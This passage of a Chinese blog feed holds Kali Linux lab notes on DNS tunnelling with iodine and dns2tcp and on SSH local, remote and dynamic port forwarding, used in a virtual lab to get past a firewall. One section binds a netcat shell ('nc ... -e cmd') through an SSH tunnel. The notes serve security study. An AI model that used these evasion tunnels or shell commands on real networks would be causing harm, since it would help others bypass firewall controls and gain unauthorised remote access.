<li>配置一个静态的IP地址，设置DNS服务器为127.0.0.1（ipconfig查询所用IP地址）</li>
<li>安装DNS服务器<ul>
<li>安装DNS服务器（Win+R → appwiz.cpl → 更改或添加程序 → 网络服务 → 域名系统，可能需要光盘）</li>
<li>开始 → 管理工具 → DNS → 正向查询区域 → 右键 → 新建区域</li>
<li>主要区域、区域名称（lab.com）</li>
</ul>
</li>
<li>配置转发器（转发到外网的DNS服务器，不做迭代查询）<ul>
<li>服务器图标 → 右键 → 属性 → 转发 → 外网的DNS服务器（Window Server 2003）</li>
</ul>
</li>
<li>浏览器登陆mono，修改之前TCP/UDP的规则，改为只允许UDP通过，保存修改</li>
<li>登陆防火墙查看规则（源和目的：Single host or alias，设置目的IP为Window Server 2003的IP地址）</li>
<li>nslookup解析lab.com、test.lab.com、新浪、百度的域名，查看是否能正常通信</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：service squid start</code></strong></li>
<li>开启SSH服务（擦除以前所作操作）</li>
<li>**`🔺命令：netstat -pantu（查看3128端口和22端口是否开放）</li>
<li>运行服务器端：<strong><code>🔺命令：iodined -f -c 10.0.0.1（服务器隧道IP） test.lab.com</code></strong> <ul>
<li>-f 前端显示（可选）</li>
<li>-c 不检查客户端IP</li>
<li>IP 服务器端隧道IP的地址</li>
</ul>
</li>
<li>▲ 需要设置密码才能建立隧道，ifconfig查看是否多出一个网卡</li>
</ul>
</li>
<li>Window Server 2003（内网的DNS服务器）<ul>
<li>安装TAP网卡驱动<ul>
<li>▲ 需要进行翻墙下载网卡驱动 ▲ openvpn-install-2.3.11-I001-i686.exe</li>
<li><a href="https://openvpn.net/index.php/open-source/downloads.html" target="_blank" rel="noopener">https://openvpn.net/index.php/open-source/downloads.html</a></li>
<li>只安装TAP Virtual Ethernet Adapter和所有依赖包</li>
</ul>
</li>
<li>Windows客户端<ul>
<li>▲ 需要进行翻墙下载iodine ▲ iodine-0.7.0-windows.zip</li>
<li><a href="http://code.kryo.se/iodine/" target="_blank" rel="noopener">http://code.kryo.se/iodine/</a> </li>
<li><strong><code>🔺命令：iodine -f test.lab.com</code></strong></li>
<li>▲ 需要输入密码才能建立隧道（需同服务器端密码相同），ifconfig查看是否多出一个网卡，进行ping 服务器端的IP地址看能否相同</li>
</ul>
</li>
<li>建立动态SSH隧道（使用putty）▲ 2020.2.2 安装putty报Installation Directory must be on a local hard drive的错误，但连接不存在问题，可以上Kali上的Web服务<ul>
<li>Connection → SSH → Tunnels</li>
<li>Local ports accept connections from other hosts</li>
<li>Source port（7001）、Desitination（Kali的虚拟IP）、Auto、Dynamic → Add</li>
</ul>
</li>
<li>修改Internet选项，设置代理服务器socks Proxy代理127.0.0.1:7001，访问网络尝试</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(六十九)：DNS隧道--dns2tcp</title>
    <url>/2020/02/02/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B9%9D)%EF%BC%9ADNS%E9%9A%A7%E9%81%93--dns2tcp/</url>
    <content><![CDATA[<hr>
<h4 id="1-DNS协议隧道"><a href="#1-DNS协议隧道" class="headerlink" title="1. DNS协议隧道"></a>1. DNS协议隧道</h4><ul>
<li>防火墙禁止TCP出站访问流量<ul>
<li>SSH隧道、端口转发全部失效</li>
<li>使用基于UDP协议的隧道</li>
<li>DNS的工作原理适合用于实现隧道</li>
<li>▲ TCP53–域名服务的冗余更新，域名服务器之间的传输/UDP53–用于域名服务的查询</li>
</ul>
</li>
<li>DNS工作原理<ul>
<li>DNS隧道原理：注册受自己控制的DNS记录</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/DNS%E8%A7%A3%E6%9E%90%E8%BF%87%E7%A8%8B.PNG" srcset="/img/loading.gif" alt="DNS解析过程"></p>
<p><img src="/images/kali/kali-notepad/%E4%B8%A4%E7%A7%8DDNS%E6%9F%A5%E8%AF%A2.PNG" srcset="/img/loading.gif" alt="两种DNS查询"></p>
<h4 id="2-Dns2tcp"><a href="#2-Dns2tcp" class="headerlink" title="2. Dns2tcp"></a>2. Dns2tcp</h4><ul>
<li>利用合法的DNS服务器实现DNS隧道</li>
<li>C/S（dns2tcpc/dns2tcpd）结构</li>
<li>通过TXT记录加密传输数据（A记录长度有限，前面最大为63个字节）</li>
<li>隧道建立后保持连接</li>
<li>默认记录生存时间TTL值为3秒，由查询的DNS服务器告诉缓存时间（缓存时间越长越好）</li>
<li>域名记录长度是有限的</li>
<li>安装<ul>
<li><strong><code>🔺命令：apt-get install dns2tcp</code></strong></li>
<li>Kali默认安装</li>
</ul>
</li>
<li>资源访问<ul>
<li>本地SSH资源</li>
<li>远程http资源</li>
<li>http代理（squid，<strong><code>🔺命令：apt-get install squid3</code></strong>）</li>
<li>https代理</li>
<li>隧道嵌套<ul>
<li>基于SSH资源将</li>
<li><strong><code>🔺命令：ssh -CfNg root@127.0.0.1 -p 2222 -D 7001</code></strong></li>
<li>XP IE、Firefox使用嵌套的Socks代理上网</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="3-实验-1"><a href="#3-实验-1" class="headerlink" title="3. 实验-1"></a>3. 实验-1</h4><ul>
<li>实验机子：Linux主机（bodhi）/防火墙（mono）/外网主机（Kali）</li>
<li>Mono防火墙<ul>
<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
</ul>
</li>
<li>bodhi<ul>
<li>插入bodhi-3.2.0-64.iso光盘，安装到硬盘，修改网络为Host-only方式，检查网络</li>
<li>查看网管（netstat -nr，看是否为mono网关）</li>
<li>浏览器登陆mono，修改之前TCP/UDP的规则，改为只允许UDP通过，保存修改</li>
<li>浏览器登陆mono，开启默认规则以便能上网，下载dns2tcp、wireshark、firefox，下载完成后关闭默认规则</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>Window Server 2003<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>安装DNS服务器<ul>
<li>安装DNS服务器（Win+R → appwiz.cpl → 更改或添加程序 → 网络服务 → 域名系统，可能需要光盘）</li>
<li>配置一个静态的IP地址，设置DNS服务器为127.0.0.1（ipconfig查询所用IP地址）</li>
<li>开始 → 管理工具 → DNS → 正向查询区域 → 右键 → 新建区域</li>
<li>主要区域、区域名称（lab.com）</li>
</ul>
</li>
<li>NS记录指向Kali<ul>
<li>右键lab.com空白区域 → 新建主机 → 名称（Kali）、IP（Kali的IP地址）</li>
</ul>
</li>
<li>创建区域lab.com，指派二级域test.lab.com<ul>
<li>lab.com → 右键 → 新建委派 → test → 添加（Kali的主机记录）→ 解析</li>
</ul>
</li>
<li>配置转发器（转发到外网的DNS服务器，不做迭代查询）<ul>
<li>服务器图标 → 右键 → 属性 → 转发 → 添加物理网络的DNS服务器（ipconfig查询）</li>
</ul>
</li>
</ul>
</li>
<li>bodhi<ul>
<li><strong><code>🔺命令：sudo vi /etc/resolv.conf</code></strong> → 修改为Window Server 2003的IP地址</li>
<li>nslookup<ul>
<li><strong><code>🔺命令：set q=ns lab.com</code></strong>（查看是否为Window Server 2003的IP地址）</li>
<li><strong><code>🔺命令：set q=ns test.lab.com</code></strong>（查看是否为kali.lab.com）</li>
<li><strong><code>🔺命令：www.baoidu.com</code></strong>（看是否能解析为外网的IP地址）</li>
<li><strong><code>🔺命令：www.taobao.com</code></strong>（看是否能解析为外网的IP地址）</li>
</ul>
</li>
</ul>
</li>
<li>Kali<ul>
<li>服务端配置文件<ul>
<li><strong><code>🔺命令：vi /etc/dns2tcpd.conf</code></strong>（修改listen为0.0.0.0，domain为test.lab.com，增加resources：socks:127.0.0.1:22716,http:192.168.0.1:80,https:0.0.0.0:8087，key=pass123）</li>
<li>.dns2tcprcd</li>
<li>资源可以是其他地址</li>
</ul>
</li>
<li>开启socks代理，如GoAgent；开启SSH服务（擦除以前所作操作）</li>
<li>启动<ul>
<li><strong><code>🔺命令：dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf</code></strong> </li>
<li>-F：前端显示运行状态</li>
<li>-d：dubug level 1-3</li>
<li>-f：指定配置文件</li>
</ul>
</li>
<li>开启抓包（Wireshark，只抓取dns的数据包）</li>
</ul>
</li>
<li>Window Server 2003<ul>
<li>装入抓包软件（ComView，可能需要替换exe文件）</li>
<li>Rules → IP Addresses → Both（Kali的IP，mono防火墙的IP）</li>
</ul>
</li>
<li>bodhi<ul>
<li>禁用mono防火墙的规则</li>
<li>启动抓包工具（sudo wireshark，需要进行过滤数据包）</li>
<li><strong><code>🔺命令：dns2tcpc -c -k pass123 -d 1 -l 2222 -r ssh -z test.lab.com</code></strong><ul>
<li>-c：启动压缩，提高访问效率</li>
<li>-k：设置的密码</li>
<li>-d：dubug level 1-3</li>
<li>-l：本地侦听端口，用于连接隧道</li>
<li>-r：资源名称（ssh、socks、http、https）</li>
<li>-z：使用的域名</li>
</ul>
</li>
<li><strong><code>🔺命令：ssh root@127.0.0.1 -p 2222</code></strong></li>
</ul>
</li>
<li>bodhi抓包分析、Kali抓包分析、Window Server 2003抓包分析</li>
<li>bodhi（http）<ul>
<li><strong><code>🔺命令：dns2tcpc -c -k pass123 -d 1 -l 2222 -r http -z test.lab.com</code></strong></li>
<li>浏览器访问127.0.0.1:2222，是否被重定向到192.168.1.1</li>
</ul>
</li>
<li>bodhi（socks）<ul>
<li><strong><code>🔺命令：dns2tcpc -c -k pass123 -d 1 -l 2222 -r socks -z test.lab.com</code></strong></li>
<li>浏览器配置socks代理资源，访问Google尝试</li>
</ul>
</li>
<li>bodhi（ssh，作网管模式）<ul>
<li><strong><code>🔺命令：dns2tcpc -c -k pass123 -d 1 -l 2222 -r ssh -z test.lab.com</code></strong></li>
<li><strong><code>🔺命令：ssh -CfNg root@127.0.0.1 -p 2222 -D 7001</code></strong></li>
</ul>
</li>
<li>Window XP<ul>
<li>网卡方式为Host-only方式，检查网络</li>
<li>浏览器 → 工具（Internet选项）→ 连接 → 局域网设置 → 设置代理服务器（bodhi的7001端口）</li>
<li>上网尝试 ▲ 2020.2.2 ssh隧道的网管模式存在Bug，能连接但无法上网</li>
</ul>
</li>
<li>bodhi<ul>
<li>浏览器配置HTTP proxy的7001端口，进行上网尝试 ▲ 2020.2.2 ssh隧道的网管模式存在Bug，能连接但无法上网</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/%E6%BC%94%E7%A4%BA%E7%8E%AF%E5%A2%83-1.PNG" srcset="/img/loading.gif" alt="演示环境-1"></p>
<h4 id="4-实验-2"><a href="#4-实验-2" class="headerlink" title="4. 实验-2"></a>4. 实验-2</h4><ul>
<li>FW限制只允许内网DNS服务器访问外网指定DNS服务器UDP53端口</li>
<li>内网DNS服务器：安装DNS服务器，配置转发器到外网DNS服务器</li>
<li>实验机子：Linux主机（bodhi）/防火墙（mono）/外网主机（Kali）</li>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>Window Server 2003（外网的DNS服务器）<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>配置一个静态的IP地址，设置DNS服务器为127.0.0.1（ipconfig查询所用IP地址）</li>
<li>安装DNS服务器<ul>
<li>安装DNS服务器（Win+R → appwiz.cpl → 更改或添加程序 → 网络服务 → 域名系统，可能需要光盘）   </li>
<li>开始 → 管理工具 → DNS → 正向查询区域 → 右键 → 新建区域</li>
<li>主要区域、区域名称（lab.com）</li>
</ul>
</li>
<li>NS记录指向Kali<ul>
<li>右键lab.com空白区域 → 新建主机 → 名称（w2k3）、IP（2003的IP地址）</li>
<li>本机的NS记录进行更新，指向w2k3.lab.com</li>
<li>右键lab.com空白区域 → 新建主机 → 名称（Kali）、IP（Kali的IP地址）</li>
</ul>
</li>
<li>创建区域lab.com，指派二级域test.lab.com<ul>
<li>lab.com → 右键 → 新建委派 → test → 添加（kali的主机记录）→ 解析</li>
<li>ping kali.lab.com查看是否能进行正常通信</li>
</ul>
</li>
<li>配置转发器（转发到外网的DNS服务器，不做迭代查询）<ul>
<li>服务器图标 → 右键 → 属性 → 转发 → 添加物理网络的DNS服务器（ipconfig查询）</li>
<li>nslookup解析新浪和百度的域名，查看是否能正常通信</li>
</ul>
</li>
</ul>
</li>
<li>Kali<ul>
<li>服务端配置文件<ul>
<li><strong><code>🔺命令：vi /etc/dns2tcpd.conf</code></strong>（修改listen为0.0.0.0，domain为test.lab.com，增加resources：http:127.0.0.1:3128，key=pass123）</li>
<li>.dns2tcprcd</li>
<li>资源可以是其他地址</li>
</ul>
</li>
<li>开启SSH服务（擦除以前所作操作）</li>
<li>启动<ul>
<li><strong><code>🔺命令：dns2tcpd -F -d 1 -f /etc/dns2tcpd.conf</code></strong> </li>
<li>-F：前端显示运行状态</li>
<li>-d：dubug level 1-3</li>
<li>-f：指定配置文件</li>
</ul>
</li>
<li>安装squid<ul>
<li><strong><code>🔺命令：apt-get install squid3</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Mono防火墙<ul>
<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
</ul>
</li>
<li>bodhi<ul>
<li>插入bodhi-3.2.0-64.iso光盘，安装到硬盘，修改网络为Host-only方式，检查网络</li>
<li>查看网管（netstat -nr，看是否为mono网关）</li>
<li>浏览器登陆mono，修改之前TCP/UDP的规则，改为只允许UDP通过，保存修改</li>
<li>浏览器登陆mono，开启默认规则以便能上网，下载dns2tcp、wireshark、firefox，下载完成后关闭默认规则</li>
</ul>
</li>
<li>Window Server 2003（内网的DNS服务器）<ul>
<li>网卡方式为Host-only方式，检查网络</li>
<li>配置一个静态的IP地址，设置DNS服务器为127.0.0.1（ipconfig查询所用IP地址）</li>
<li>安装DNS服务器<ul>
<li>安装DNS服务器（Win+R → appwiz.cpl → 更改或添加程序 → 网络服务 → 域名系统，可能需要光盘）</li>
</ul>
</li>
<li>配置转发器（转发到外网的DNS服务器，不做迭代查询）<ul>
<li>服务器图标 → 右键 → 属性 → 转发 → 外网的DNS服务器（Window Server 2003）</li>
</ul>
</li>
<li>登陆防火墙查看规则（源和目的：Single host or alias，设置目的IP为Window Server 2003的内网外网IP地址）</li>
<li>nslookup解析新浪、百度的域名，查看是否能正常通信</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：service squid start</code></strong> </li>
<li><strong><code>🔺命令：netstat -pantu</code></strong>（查看3128端口和22端口是否开放）</li>
</ul>
</li>
<li>bodhi<ul>
<li><strong><code>🔺命令：sudo vi /etc/resolv.conf</code></strong> → 修改为内网Window Server 2003的IP地址</li>
<li><strong><code>🔺命令：dig -t ns lab.com</code></strong>（查看是否解析到w2k3.lab.com以及IP地址）</li>
<li><strong><code>🔺命令：dig -t ns test.lab.com</code></strong>（查看是否正常解析） ▲ 2020.2.1 dig无法正常解析，但nslookup可以正常解析，最后也能正常上网</li>
<li><strong><code>🔺命令：dns2tcpc -c -k pass123 -d 1 -l 8080 -r http -z test.lab.com</code></strong><ul>
<li>-c：启动压缩，提高访问效率</li>
<li>-k：设置的密码</li>
<li>-d：dubug level 1-3</li>
<li>-l：本地侦听端口，用于连接隧道</li>
<li>-r：资源名称（ssh、socks、http、https）</li>
<li>-z：使用的域名</li>
</ul>
</li>
<li>设置浏览器代理，HTTP proxy → 127.0.0.1:8080，进行网络访问尝试</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/%E6%BC%94%E7%A4%BA%E7%8E%AF%E5%A2%83-2.PNG" srcset="/img/loading.gif" alt="演示环境-2"></p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(六十八)：SSH隧道--动态端口转发及X协议转发</title>
    <url>/2020/02/01/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E5%85%AB)%EF%BC%9ASSH%E9%9A%A7%E9%81%93--%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%8F%8AX%E5%8D%8F%E8%AE%AE%E8%BD%AC%E5%8F%91/</url>
    <content><![CDATA[<hr>
<h4 id="1-SSH动态端口转发"><a href="#1-SSH动态端口转发" class="headerlink" title="1. SSH动态端口转发"></a>1. SSH动态端口转发</h4><ul>
<li>本地、远程端口转发都需要固定应用服务器IP、Port<ul>
<li>应用端口繁多，逐个转发效率低</li>
<li>某些应用不固定端口</li>
<li>某些网站不支持IP直接访问，请求头需要域名</li>
<li>使用非受信网络上网保护流量不被嗅探</li>
</ul>
</li>
<li>本地侦听socks4/5代理端口<ul>
<li>由SSH server决定如何转发</li>
<li>作为翻墙代理使用</li>
<li>使用proxychains支持无代理客户端（多个代理，多节点）</li>
</ul>
</li>
<li>实验操作<ul>
<li>bodhi<ul>
<li><strong><code>🔺命令：ssh -CfNg -D 7001 root@Kali的IP地址 -p 53</code></strong>（类似GoAgent的方式）</li>
</ul>
</li>
<li>Window XP<ul>
<li>配置客户端代理（浏览器）</li>
<li>上网访问尝试（bing/baidu/taobao）</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/SSH%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91.PNG" srcset="/img/loading.gif" alt="SSH动态端口转发"></p>
<h4 id="2-X协议转发"><a href="#2-X协议转发" class="headerlink" title="2. X协议转发"></a>2. X协议转发</h4><ul>
<li>远程登陆Linux GUI运行图形化界面工具<ul>
<li>VNC</li>
<li>X Window</li>
</ul>
</li>
<li>防火墙限制访问时<ul>
<li>基于SSH的X转发</li>
<li><strong><code>🔺命令：ssh -X user@1.1.1.1 -p 53</code></strong></li>
</ul>
</li>
<li>演示操作<ul>
<li>bodhi<ul>
<li><strong><code>🔺命令：ssh -X root@Kali的IP地址 -p 53</code></strong></li>
<li><strong><code>🔺命令：shell → gedit/firefox</code></strong>（Kali机器上的映射）</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(六十七)：SSH隧道--远程端口转发</title>
    <url>/2020/02/01/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E4%B8%83)%EF%BC%9ASSH%E9%9A%A7%E9%81%93--%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
    <content><![CDATA[<hr>
<h4 id="1-SSH远程端口转发"><a href="#1-SSH远程端口转发" class="headerlink" title="1. SSH远程端口转发"></a>1. SSH远程端口转发</h4><ul>
<li>由于ACL等原因，SSH与应用连接建立方向相反</li>
<li>本地端口转发<ul>
<li>SSH客户端+应用客户端位于防火墙一端</li>
<li>SSH服务端+应用服务端位于另一端</li>
</ul>
</li>
<li>远程端口转发<ul>
<li>SSH客户端、应用客户端位于防火墙两端</li>
<li>SSH服务端、应用服务端位于防火墙两端</li>
</ul>
</li>
<li>之所以称为远程，是因为SSH侦听端口开在远程的SSH Server服务上</li>
<li>侦听端口永远开在应用客户端一方</li>
<li>▲ 远程端口转发不支持网管模式</li>
</ul>
<p><img src="/images/kali/kali-notepad/SSH%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91.PNG" srcset="/img/loading.gif" alt="SSH远程端口转发"></p>
<h4 id="2-准备"><a href="#2-准备" class="headerlink" title="2. 准备"></a>2. 准备</h4><ul>
<li>实验机子：Linux主机/防火墙（mono）/Web服务器（KALI/2007），关闭机子的防火墙</li>
<li>Metasploit主机<ul>
<li>插入bodhi-3.2.0-64.iso光盘，用光盘启动，修改网络为Host-only方式，检查网络</li>
</ul>
</li>
<li>Mono防火墙<ul>
<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
</ul>
</li>
<li>Kali主机<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>修改Kali的/etc/ssh/sshd_config配置</li>
<li><strong><code>🔺命令：service ssh restart，查看SSH是否正常运行</code></strong>（<strong><code>🔺命令：netstat -pantu | grep 53</code></strong>）</li>
</ul>
</li>
<li>Window Server 2003<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>bodhi主机<br> <strong><code>🔺命令：ssh -fNg -R &lt;listen port&gt;:&lt;remote ip&gt;:&lt;remote port&gt; user@&lt;SSH server&gt; -p &lt;ssh server port&gt;</code></strong> </li>
<li>Win XP主机<ul>
<li>网卡方式为Host-only方式，检查网络</li>
</ul>
</li>
</ul>
<h4 id="3-Web服务（Window-XP）"><a href="#3-Web服务（Window-XP）" class="headerlink" title="3. Web服务（Window XP）"></a>3. Web服务（Window XP）</h4><ul>
<li>Window XP <ul>
<li>安装web server（Win+R → appwiz.cpl → 更改或添加程序 → 应用程序服务器 → IIS，可能需要光盘）</li>
<li>修改Web的首页面（C:\Inetpub\wwwroot\iisstart.html）</li>
<li>访问127.0.0.1进行尝试</li>
</ul>
</li>
<li>bodhi<ul>
<li><strong><code>🔺命令：ssh -CfN -R 7001:Window XP的IP:80 root@Kali的IP -p 53</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：netstat -pantu | grep 7001</code></strong>（查看是否开启了侦听端口服务）</li>
<li>访问127.0.0.1:7001端口进行Window XP的Web服务</li>
</ul>
</li>
<li>▲ 2020.2.1 Window XP没有安装IIS的选项</li>
</ul>
<h4 id="4-远程桌面（Window-XP）"><a href="#4-远程桌面（Window-XP）" class="headerlink" title="4. 远程桌面（Window XP）"></a>4. 远程桌面（Window XP）</h4><ul>
<li>Window XP<ul>
<li>开启远程桌面，cmd修改管理员密码（<strong><code>🔺命令：net user administrator *</code></strong>）</li>
</ul>
</li>
<li>bodhi<ul>
<li><strong><code>🔺命令：ssh -CfN -R 7002:Window XP的IP:3389 root@Kali的IP -p 53</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：netstat -pantu | grep 7002</code></strong>（查看是否开启了侦听端口服务）</li>
<li>rdesktop → 127.0.0.1:7002</li>
</ul>
</li>
<li>▲ 2020.2.1 bodhi上能看到来自外网Kali的访问数据，但打不开远程桌面</li>
</ul>
<h4 id="5-NC-shell"><a href="#5-NC-shell" class="headerlink" title="5. NC shell"></a>5. NC shell</h4><ul>
<li>Window XP<ul>
<li><strong><code>🔺命令：nc -nvlp 3333</code></strong></li>
</ul>
</li>
<li>bodhi<ul>
<li><strong><code>🔺命令：ssh -CfN -L 7003:Kali的IP:3333 root@Kali的IP -p 53</code></strong></li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：nc 127.0.0.1 7003 -e cmd</code></strong></li>
</ul>
</li>
</ul>
<h4 id="6-SSH端口转发安全隐患"><a href="#6-SSH端口转发安全隐患" class="headerlink" title="6. SSH端口转发安全隐患"></a>6. SSH端口转发安全隐患</h4><ul>
<li>（A）&lt;–&gt;（C）以及（B）&lt;–&gt;（D）之间通信未加密，可嗅探</li>
</ul>
<p><img src="/images/kali/kali-notepad/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3.PNG" srcset="/img/loading.gif" alt="SSH端口转发安全隐患"></p>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(六十六)：SSH隧道--本地端口转发</title>
    <url>/2020/02/01/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AD%E5%8D%81%E5%85%AD)%EF%BC%9ASSH%E9%9A%A7%E9%81%93--%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
    <content><![CDATA[<hr>
<h4 id="1-SSH隧道"><a href="#1-SSH隧道" class="headerlink" title="1. SSH隧道"></a>1. SSH隧道</h4><ul>
<li>SSH支持双向通信隧道<ul>
<li>将其他TCP端口的通信通过SSH链接来转发</li>
<li>用SSH作为传输层协议，对流量自动加解密</li>
<li>突破防火墙访问规则的限制，可用于翻墙</li>
</ul>
</li>
<li>本地端口转发<ul>
<li>本地侦听端口，访问转发到远程主机指定端口（SSH流量的流向/应用层流量一致）</li>
<li>使效果类似于rinetd</li>
<li>多个流量通过隧道进行转发</li>
<li>将一本地端口与远程服务器建立隧道</li>
<li>▲ SSH隧道建立侦听的端口在内网服务器，侦听的端口形象理解为外网服务器的隧道端口</li>
</ul>
</li>
<li>远程端口转发<ul>
<li>远程侦听端口，访问转发到本机主机指定端口（SSH流量的流向/应用层流量不一致）</li>
<li>▲ SSH隧道建立侦听的端口在外网服务器，侦听的端口形象理解为内网服务器的隧道端口</li>
</ul>
</li>
<li>动态隧道模式</li>
</ul>
<h4 id="2-SSH本地端口转发"><a href="#2-SSH本地端口转发" class="headerlink" title="2. SSH本地端口转发"></a>2. SSH本地端口转发</h4><ul>
<li>将一本地端口与远程服务器建立隧道</li>
<li><strong><code>🔺命令：vi /etc/ssh/sshd_config</code></strong><ul>
<li>PermitRootLogin yes</li>
<li>Port 53</li>
<li>PasswordAuthentication yes</li>
</ul>
</li>
<li>端口转发基于建立起来的SSH隧道，隧道中断则端口转发中断</li>
<li>只能在建立隧道时创建转发，不能为已有隧道增加端口转发</li>
</ul>
<p><img src="/images/kali/kali-notepad/SSH%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91.PNG" srcset="/img/loading.gif" alt="SSH本地端口转发"></p>
<h4 id="3-准备"><a href="#3-准备" class="headerlink" title="3. 准备"></a>3. 准备</h4><ul>
<li>实验机子：Linux主机/防火墙（mono）/Web服务器（KALI/2007），关闭机子的防火墙</li>
<li>Metasploit主机<ul>
<li>插入bodhi-3.2.0-64.iso光盘，用光盘启动，修改网络为Host-only方式，检查网络</li>
</ul>
</li>
<li>Mono防火墙<ul>
<li>第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查</li>
</ul>
</li>
<li>Kali主机<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li>修改Kali的/etc/ssh/sshd_config配置</li>
<li><strong><code>🔺命令：service ssh restart，查看SSH是否正常运行</code></strong>（<strong><code>🔺命令：netstat -pantu | grep 53</code></strong>）</li>
</ul>
</li>
<li>Window Server 2003<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>bodhi主机<ul>
<li>访问别机的WEB服务器：<strong><code>🔺命令：ssh -fCNg -L &lt;listen port&gt;:&lt;remote ip&gt;:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh server port&gt;</code></strong> <ul>
<li>-f（后台运行进程）</li>
<li>-N（不执行登陆Shell）</li>
<li>-g（服用访问时作为网管，支持多主机访问本地侦听端口）</li>
<li>-C（链接建立内容进行压缩）</li>
<li>网管模式转发RDP、NC shell</li>
</ul>
</li>
<li>访问本机的WEB服务器：<strong><code>🔺命令：ssh -fCNg -L &lt;listen port&gt;:localhost:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh port&gt;</code></strong>   </li>
</ul>
</li>
<li>Win XP主机<ul>
<li>网卡方式为Host-only方式，检查网络</li>
</ul>
</li>
</ul>
<h4 id="4-Web服务（Window-Server-2003）"><a href="#4-Web服务（Window-Server-2003）" class="headerlink" title="4. Web服务（Window Server 2003）"></a>4. Web服务（Window Server 2003）</h4><ul>
<li>Window Server 2003<ul>
<li>安装web server（Win+R → appwiz.cpl → 更改或添加程序 → 应用程序服务器 → IIS，可能需要光盘）</li>
<li>修改Web的首页面（C:\Inetpub\wwwroot\iisstart.html）</li>
<li>访问127.0.0.1进行尝试</li>
</ul>
</li>
<li>bodhi<ul>
<li><strong><code>🔺命令：ssh -CfN -L 7001:Window Server 2003的IP:80 root@Kali的IP -p 53</code></strong></li>
<li>本机访问127.0.0.1:7001进行测试，看能否访问到Window Server 2003上的Web服务</li>
</ul>
</li>
</ul>
<h4 id="5-Web服务（Kali）"><a href="#5-Web服务（Kali）" class="headerlink" title="5. Web服务（Kali）"></a>5. Web服务（Kali）</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：service apache2 start</code></strong>，尝试访问是否能正常访问</li>
</ul>
</li>
<li>bodhi<ul>
<li><strong><code>🔺命令：ssh -CfN -L 7002:localhost:80 root@Kali的IP -p 53</code></strong></li>
<li>本机访问127.0.0.1:7002进行测试，看能否访问到Kali上的Web服务</li>
</ul>
</li>
</ul>
<h4 id="6-远程桌面（bodhi访问）"><a href="#6-远程桌面（bodhi访问）" class="headerlink" title="6. 远程桌面（bodhi访问）"></a>6. 远程桌面（bodhi访问）</h4><ul>
<li>Window Server 2003<ul>
<li>开启远程桌面，cmd修改管理员密码（net user administrator *）</li>
</ul>
</li>
<li>bodhi<ul>
<li><strong><code>🔺命令：ssh -CfN -L 7003:Window Server 2003的IP:3389 root@Kali的IP -p 53</code></strong></li>
<li>打开mono的GUI管理界面，开启默认上网设置，下载rdesktop，测试是否能进行远程桌面登陆（Window Server 2003的远程桌面）</li>
</ul>
</li>
</ul>
<h4 id="7-远程桌面（XP访问）"><a href="#7-远程桌面（XP访问）" class="headerlink" title="7.  远程桌面（XP访问）"></a>7.  远程桌面（XP访问）</h4><ul>
<li>Window Server 2003<ul>
